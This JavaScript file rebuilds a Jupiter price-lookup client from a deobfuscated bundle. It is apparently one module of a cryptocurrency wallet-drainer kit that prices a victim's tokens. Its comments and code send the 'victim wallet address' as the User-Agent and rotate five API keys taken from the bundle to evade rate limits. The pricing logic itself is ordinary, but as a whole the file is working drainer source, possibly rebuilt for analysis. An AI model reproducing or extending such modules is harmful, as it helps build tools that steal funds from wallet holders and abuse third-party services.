/**
 * rebuilt/chain/jupiter.js
 *
 * Jupiter price API client.
 *
 * Sources:
 *   - bundle.deobfuscated.js lines 20211–20370 (class 党, 軩 fetch method)
 *   - decompiled/kit/chain/jupiter_api.js
 *   - AUDIT_AND_ROADMAP.md (M4 — missing Jupiter client)
 *   - String table [278–284]: API keys and endpoint paths
 *
 * Base URL: https://api.jup.ag/   (瞮, string table [211 area])
 * Endpoints:
 *   price/v3?ids={mints}      — batch price lookup (string[283] = "price/v3?ids=")
 *   tokens/v2/search?query=   — token search (string[284])
 *   (wSOL price via En(wSOL) = single lookup)
 *
 * API key rotation: 5 keys from string table [278–282].
 * On 401 or 429: advance key index, retry (up to 5 times).
 * User-Agent = victim wallet address (same as RPC client).
 * referrerPolicy: "no-referrer"
 * Timeout: 2000 ms (not 2500!)
 *
 * Batch size: 50 mints per request (from deob line 20223: 齢 += 50)
 */

'use strict';

const { JUPITER_API_KEYS } = require('../config/constants');

const JUPITER_BASE_URL = 'https://api.jup.ag/';
const PRICE_ENDPOINT   = 'price/v3?ids=';     // string[283]
const SEARCH_ENDPOINT  = 'tokens/v2/search?query='; // string[284]
const BATCH_SIZE       = 50;
const TIMEOUT_MS       = 2000; // NOTE: 2000 not 2500 — confirmed from deob

let keyIndex = 0; // current API key index

/**
 * jupiterFetch(path, walletAddress):
 *   Inner fetch with key rotation on 401/429.
 *   Retries up to 5 times (all 5 keys).
 */
async function jupiterFetch(path, walletAddress, retriesLeft = JUPITER_API_KEYS.length) {
  const response = await fetch(JUPITER_BASE_URL + path, {
    headers: {
      'User-Agent': walletAddress || 'kit',
      'x-api-key':  JUPITER_API_KEYS[keyIndex],
    },
    signal: AbortSignal.timeout(TIMEOUT_MS),
    referrerPolicy: 'no-referrer',
  });

  if (!response.ok) {
    if (retriesLeft > 0 && (response.status === 401 || response.status === 429)) {
      // Rotate to next key (round-robin)
      keyIndex = (keyIndex + 1) % JUPITER_API_KEYS.length;
      return jupiterFetch(path, walletAddress, retriesLeft - 1);
    }
    throw new Error('Jupiter API error: ' + response.status);
  }
  return response.json();
}

/**
 * priceTokens(mintAddresses, walletAddress):
 *   Batch price lookup. Splits into chunks of 50.
 *   Returns Map<mintAddress, [priceUsd, ...]>
 */
async function priceTokens(mintAddresses, walletAddress) {
  const result = new Map();
  for (let i = 0; i < mintAddresses.length; i += BATCH_SIZE) {
    const batch = mintAddresses.slice(i, i + BATCH_SIZE);
    const path  = PRICE_ENDPOINT + batch.join(',');
    const data  = await jupiterFetch(path, walletAddress);
    // Response: { data: { [mintAddr]: { price: number, ... } } }
    if (data?.data) {
      for (const [mint, info] of Object.entries(data.data)) {
        result.set(mint, [info.price ?? 0]);
      }
    }
  }
  return result;
}

/**
 * tokenPrice(mintAddress, walletAddress):
 *   Single token price. Returns USD price as number.
 */
async function tokenPrice(mintAddress, walletAddress) {
  const prices = await priceTokens([mintAddress], walletAddress);
  return prices.get(mintAddress)?.[0] ?? 0;
}

/**
 * searchToken(mintAddress, walletAddress):
 *   Token metadata lookup by mint address.
 *   Returns token metadata object from Jupiter's token list.
 */
async function searchToken(mintAddress, walletAddress) {
  const results = await jupiterFetch(SEARCH_ENDPOINT + mintAddress, walletAddress);
  const found = Array.isArray(results)
    ? results.find(t => t.id === mintAddress)
    : null;
  if (!found) throw new Error('cant find token');
  return found;
}

/**
 * solPrice(walletAddress):
 *   SOL/USD price via wSOL mint lookup.
 *   wSOL = So11111111111111111111111111111111111111112 (string[?] in bundle)
 */
async function solPrice(walletAddress) {
  const WSOL = 'So11111111111111111111111111111111111111112';
  return tokenPrice(WSOL, walletAddress);
}

module.exports = {
  jupiterFetch, priceTokens, tokenPrice, searchToken, solPrice,
  JUPITER_BASE_URL, PRICE_ENDPOINT, SEARCH_ENDPOINT,
};
